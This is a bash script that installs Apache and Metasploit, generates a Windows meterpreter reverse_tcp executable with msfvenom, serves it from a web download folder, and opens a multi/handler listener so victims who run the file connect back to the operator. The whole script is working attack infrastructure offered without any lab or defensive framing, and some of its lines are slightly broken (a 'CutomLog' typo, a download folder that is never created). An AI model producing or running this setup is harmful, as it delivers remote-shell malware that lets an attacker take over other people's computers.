#!/bin/bash

# Install Apache web server and Metasploit
sudo apt-get update
sudo apt-get install apache2 metasploit-framework -y

# Configure Apache to listen on all network interfaces and log requests to a file
sudo sed -i 's/Listen 80/Listen 0.0.0.0:80/g' /etc/apache2/ports.conf
sudo sed -i 's/#CustomLog/CutomLog/g' /etc/apache2/sites-available/000-default.conf
sudo sed -i 's/#ErrorLog/ErrorLog/g' /etc/apache2/sites-available/000-default.conf
sudo service apache2 restart

# Get the IP address of the current machine
ip=$(hostname -I | cut -d' ' -f1)

# Set the name and path of the payload to be generated
payloadname=payload_$(date +%s).exe
payloadpath=/var/www/html/downloads/$payloadname

# Set the IP address and port of the listener
lhost=$ip
lport=$(shuf -i 4444-44444 -n 1)

# Generate the payload using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $payloadpath

# Set the permissions of the file so that it can be downloaded
chmod 644 $payloadpath

# Start the Apache web server
sudo systemctl start apache2

# Set up the Metasploit listener
echo "use exploit/multi/handler" > /tmp/msfresource
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/msfresource
echo "set LHOST $lhost" >> /tmp/msfresource
echo "set LPORT $lport" >> /tmp/msfresource
echo "exploit -j" >> /tmp/msfresource
x-terminal-emulator -e "msfconsole -q -r /tmp/msfresource"

# Set up the logging terminal
x-terminal-emulator -e "tail -f /var/log/apache2/access.log > /var/log/apache2/website.log"

# Display the IP address and instructions for accessing the web server and payload
echo "Web server started at http://${ip}/"
echo "To download the payload, visit http://${ip}/downloads/$payloadname"
echo "Metasploit listener set up on $lhost:$lport"

# Wait for user to stop the script
while true; do
    sleep 1
done
